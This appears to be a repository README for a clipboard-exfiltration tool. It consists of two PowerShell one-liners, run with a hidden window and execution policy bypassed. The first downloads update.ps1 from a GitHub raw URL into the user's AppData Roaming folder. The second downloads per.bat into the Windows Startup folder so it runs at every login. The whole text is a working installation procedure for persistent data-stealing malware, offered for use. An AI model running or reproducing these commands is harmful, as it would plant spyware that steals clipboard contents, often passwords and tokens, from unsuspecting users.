Save update.ps1 to $env:userprofile\AppData\Roaming 

`powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/offport/ClipbpardExfiltration/main/update.ps1" -OutFile "$env:userprofile\AppData\Roaming\update.ps1" -UseBasicParsing'`

Then save the bat file into startup programs

`powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/offport/ClipbpardExfiltration/main/per.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\per.bat" -UseBasicParsing'`
